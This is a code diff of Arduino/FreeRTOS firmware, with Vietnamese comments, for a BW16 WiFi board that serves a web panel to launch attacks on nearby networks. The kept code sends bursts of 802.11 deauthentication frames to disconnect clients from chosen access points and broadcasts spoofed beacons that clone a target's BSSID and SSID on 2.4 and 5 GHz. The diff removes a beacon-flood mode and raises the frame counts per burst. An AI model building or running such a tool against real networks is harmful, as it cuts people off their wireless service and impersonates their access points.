@@ -10,9 +10,11 @@
 #include "wifi_structures.h"
 #include "debug.h"
 
+// Bao gồm FreeRTOS (nếu SDK BW16 đã tích hợp FreeRTOS)
 #include <FreeRTOS.h>
 #include <task.h>
 
+// Nếu LED đã được định nghĩa trong variant thì không định nghĩa lại
 #ifndef LED_R
   #define LED_R 2
 #endif
@@ -23,23 +25,23 @@
   #define LED_B 4
 #endif
 
+// --------------------------------------------------
 // Các trạng thái của mạch
 enum DeviceState {
-  STATE_IDLE,         // Chỉ AP hoạt động
-  STATE_SCANNING,     // Đang quét mạng
-  STATE_ATTACK,       // Đang tấn công deauth
-  STATE_BEACON,       // Đang phát Beacon
-  STATE_BEACON_FLOOD  // Đang thực hiện Beacon Flood
+  STATE_IDLE,     // Chỉ AP hoạt động
+  STATE_SCANNING, // Đang quét mạng
+  STATE_ATTACK,   // Đang tấn công deauth
+  STATE_BEACON    // Đang phát Beacon (nhái)
 };
 
 volatile DeviceState currentState = STATE_IDLE;  // volatile vì được truy cập từ nhiều task
 
 // Các hằng số LED pattern (millisecond)
-const unsigned long BLINK_INTERVAL_ATTACK       = 1000;
-const unsigned long BLINK_INTERVAL_SCANNING     = 500;
-const unsigned long BLINK_INTERVAL_BEACON       = 1000; // LED nhấp nháy khi phát beacon
-const unsigned long BLINK_INTERVAL_BEACON_FLOOD = 200;  // LED nhấp nháy khi beacon flood
+const unsigned long BLINK_INTERVAL_ATTACK  = 1000;
+const unsigned long BLINK_INTERVAL_SCANNING = 500;
+const unsigned long BLINK_INTERVAL_BEACON   = 1000; // ví dụ: LED nhấp nháy theo chế độ beacon
 
+// --------------------------------------------------
 // Cấu trúc lưu trữ kết quả quét WiFi
 struct WiFiScanResult {
   String ssid;
@@ -74,20 +76,19 @@ uint8_t deauth_bssid[6];
 const uint16_t DEFAULT_DEAUTH_REASON = 2;
 uint16_t deauth_reason = DEFAULT_DEAUTH_REASON;
 
-#define FRAMES_PER_DEAUTH       10    // số frame deauth gửi mỗi lần
-#define FRAMES_PER_BEACON       200   // số frame beacon gửi mỗi lần (chế độ nhái)
-#define FRAMES_PER_BEACON_FLOOD 500   // số frame beacon gửi mỗi lần (chế độ flood)
+#define FRAMES_PER_DEAUTH 15    // số frame deauth gửi mỗi lần
+#define FRAMES_PER_BEACON 300   // số frame beacon gửi mỗi lần
 
 // --------------------------------------------------
 // Các khoảng thời gian riêng cho tấn công từng băng (ms)
 const unsigned long ATTACK_INTERVAL_24 = 150;
-const unsigned long ATTACK_INTERVAL_5  = 5;
+const unsigned long ATTACK_INTERVAL_5  = 10;
 unsigned long lastAttackTime24 = 0;
 unsigned long lastAttackTime5  = 0;
 static int currentTargetIndex24 = 0;
 static int currentTargetIndex5  = 0;
 
-// Các biến chỉ số cho beacon (các mục được “nhái” hoặc flood)
+// Các biến chỉ số cho beacon (các mục được “nhái”)
 static int currentBeaconIndex24 = 0;
 static int currentBeaconIndex5  = 0;
 
@@ -123,12 +124,6 @@ void updateLEDs() {
       lastToggleTime = now;
     }
     digitalWrite(LED_R, ledState ? HIGH : LOW);
-  } else if (currentState == STATE_BEACON_FLOOD) {
-    if (now - lastToggleTime >= BLINK_INTERVAL_BEACON_FLOOD) {
-      ledState = !ledState;
-      lastToggleTime = now;
-    }
-    digitalWrite(LED_B, ledState ? HIGH : LOW);
   }
 }
 
@@ -224,7 +219,7 @@ String makeResponse(int code, String content_type) {
 
 // --------------------------------------------------
 // Giao diện Web (HTML) – sử dụng CSS hiện đại, responsive
-// Ở đây ta dùng 1 form chứa bảng các mạng quét được và 3 nút submit riêng cho deauth, beacon và beacon flood.
+// Ở đây ta dùng 1 form chứa bảng các mạng quét được và 2 nút submit riêng cho deauth và beacon.
 void handleRoot(WiFiClient &client) {
   String response = makeResponse(200, "text/html") +
   R"(
@@ -296,13 +291,12 @@ void handleRoot(WiFiClient &client) {
           </table>
           <button type="submit" name="action" value="deauth" class="btn btn-launch">Launch Deauth</button>
           <button type="submit" name="action" value="beacon" class="btn btn-launch">Launch Beacon</button>
-          <button type="submit" name="action" value="beacon_flood" class="btn btn-launch">Launch Beacon Flood</button>
         </form>
         <form method="post" action="/rescan">
           <button type="submit" class="btn btn-rescan">Rescan Networks</button>
         </form>
   )";
-  if (currentState == STATE_ATTACK || currentState == STATE_BEACON || currentState == STATE_BEACON_FLOOD) {
+  if (currentState == STATE_ATTACK || currentState == STATE_BEACON) {
     response += R"(
       <form method="post" action="/stop">
         <button type="submit" class="btn btn-stop">Stop Attack/Beacon</button>
@@ -364,7 +358,7 @@ void WebServerTask(void *pvParameters) {
           scanNetworks();
           handleRoot(client);
         } else if (path == "/action") {
-          // Xử lý form gửi từ trang chủ
+          // Xử lý form gửi từ trang chủ (có nút "deauth" hoặc "beacon")
           std::vector<std::pair<String, String>> post_data = parsePost(request);
           String action = "";
           // Lấy tham số "action"
@@ -399,7 +393,7 @@ void WebServerTask(void *pvParameters) {
               lastAttackTime5  = millis();
             }
           } else if (action == "beacon") {
-            // Xử lý beacon: lưu các mục tiêu để gửi beacon (nhái)
+            // Xử lý beacon: lưu các mục tiêu để gửi beacon (nhái thông tin từ các mục đã quét)
             beacon_targets_24.clear();
             beacon_targets_5.clear();
             for (auto &param : post_data) {
@@ -417,28 +411,6 @@ void WebServerTask(void *pvParameters) {
             }
             if (!beacon_targets_24.empty() || !beacon_targets_5.empty()) {
               currentState = STATE_BEACON;
-              currentBeaconIndex24 = 0;
-              currentBeaconIndex5 = 0;
-            }
-          } else if (action == "beacon_flood") {
-            // Xử lý beacon flood: lưu các mục tiêu được chọn
-            beacon_targets_24.clear();
-            beacon_targets_5.clear();
-            for (auto &param : post_data) {
-              if (param.first == "network") {
-                int idx = param.second.toInt();
-                if (idx >= 0 && idx < (int)scan_results.size()) {
-                  uint8_t ch = scan_results[idx].channel;
-                  if (ch >= 36)
-                    beacon_targets_5.push_back(idx);
-                  else
-                    beacon_targets_24.push_back(idx);
-                  DEBUG_SER_PRINT("Beacon flood target idx: " + String(idx) + " (" + ((ch>=36)?"5GHz":"2.4GHz") + ")\n");
-                }
-              }
-            }
-            if (!beacon_targets_24.empty() || !beacon_targets_5.empty()) {
-              currentState = STATE_BEACON_FLOOD;
               currentBeaconIndex24 = 0;
               currentBeaconIndex5 = 0;
             }
@@ -505,7 +477,7 @@ void AttackTask(void *pvParameters) {
 
 // --------------------------------------------------
 // Task: Thực hiện phát Beacon (gửi beacon frames “nhái” thông tin mục tiêu)
-// Mỗi mục tiêu được gửi FRAMES_PER_BEACON beacon frame.
+// Mỗi mục tiêu được gửi 20 beacon frame.
 void BeaconTask(void *pvParameters) {
   (void) pvParameters;
   uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
@@ -517,6 +489,7 @@ void BeaconTask(void *pvParameters) {
         if (idx >= 0 && idx < (int)scan_results.size()) {
           wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
           for (int j = 0; j < FRAMES_PER_BEACON; j++) {
+            // Gửi beacon frame với BSSID và SSID lấy từ mục tiêu đã chọn
             wifi_tx_beacon_frame(scan_results[idx].bssid, broadcast, scan_results[idx].ssid.c_str());
             vTaskDelay(pdMS_TO_TICKS(5));
           }
@@ -534,45 +507,6 @@ void BeaconTask(void *pvParameters) {
             vTaskDelay(pdMS_TO_TICKS(5));
           }
           DEBUG_SER_PRINT("Beacon sent for 5GHz target idx: " + String(idx) + "\n");
-        }
-        currentBeaconIndex5 = (currentBeaconIndex5 + 1) % beacon_targets_5.size();
-      }
-    }
-    vTaskDelay(pdMS_TO_TICKS(10));
-  }
-}
-
-// --------------------------------------------------
-// Task: Thực hiện phát Beacon Flood (gửi nhanh loát beacon frames)
-// Sử dụng FRAMES_PER_BEACON_FLOOD beacon frame cho mỗi mục tiêu.
-void BeaconFloodTask(void *pvParameters) {
-  (void) pvParameters;
-  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-  while (1) {
-    if (currentState == STATE_BEACON_FLOOD) {
-      // Xử lý các mục tiêu băng 2.4GHz
-      if (!beacon_targets_24.empty()) {
-        int idx = beacon_targets_24[currentBeaconIndex24];
-        if (idx >= 0 && idx < (int)scan_results.size()) {
-          wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
-          for (int j = 0; j < FRAMES_PER_BEACON_FLOOD; j++) {
-            wifi_tx_beacon_frame(scan_results[idx].bssid, broadcast, scan_results[idx].ssid.c_str());
-            vTaskDelay(pdMS_TO_TICKS(1));
-          }
-          DEBUG_SER_PRINT("Beacon flood sent for 2.4GHz target idx: " + String(idx) + "\n");
-        }
-        currentBeaconIndex24 = (currentBeaconIndex24 + 1) % beacon_targets_24.size();
-      }
-      // Xử lý các mục tiêu băng 5GHz
-      if (!beacon_targets_5.empty()) {
-        int idx = beacon_targets_5[currentBeaconIndex5];
-        if (idx >= 0 && idx < (int)scan_results.size()) {
-          wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
-          for (int j = 0; j < FRAMES_PER_BEACON_FLOOD; j++) {
-            wifi_tx_beacon_frame(scan_results[idx].bssid, broadcast, scan_results[idx].ssid.c_str());
-            vTaskDelay(pdMS_TO_TICKS(1));
-          }
-          DEBUG_SER_PRINT("Beacon flood sent for 5GHz target idx: " + String(idx) + "\n");
         }
         currentBeaconIndex5 = (currentBeaconIndex5 + 1) % beacon_targets_5.size();
       }
@@ -606,7 +540,6 @@ void setup() {
   xTaskCreate(WebServerTask, "WebServer", 4096, NULL, 1, NULL);
   xTaskCreate(AttackTask, "Attack", 2048, NULL, 2, NULL);
   xTaskCreate(BeaconTask, "Beacon", 2048, NULL, 2, NULL);
-  xTaskCreate(BeaconFloodTask, "BeaconFlood", 2048, NULL, 2, NULL);
 }
 
 // --------------------------------------------------
@@ -689,27 +622,6 @@ void loop() {
         }
         if (!beacon_targets_24.empty() || !beacon_targets_5.empty()) {
           currentState = STATE_BEACON;
-          currentBeaconIndex24 = 0;
-          currentBeaconIndex5 = 0;
-        }
-      } else if (action == "beacon_flood") {
-        beacon_targets_24.clear();
-        beacon_targets_5.clear();
-        for (auto &param : post_data) {
-          if (param.first == "network") {
-            int idx = param.second.toInt();
-            if (idx >= 0 && idx < (int)scan_results.size()) {
-              uint8_t ch = scan_results[idx].channel;
-              if (ch >= 36)
-                beacon_targets_5.push_back(idx);
-              else
-                beacon_targets_24.push_back(idx);
-              DEBUG_SER_PRINT("Beacon flood target idx: " + String(idx) + " (" + ((ch>=36)?"5GHz":"2.4GHz") + ")\n");
-            }
-          }
-        }
-        if (!beacon_targets_24.empty() || !beacon_targets_5.empty()) {
-          currentState = STATE_BEACON_FLOOD;
           currentBeaconIndex24 = 0;
           currentBeaconIndex5 = 0;
         }
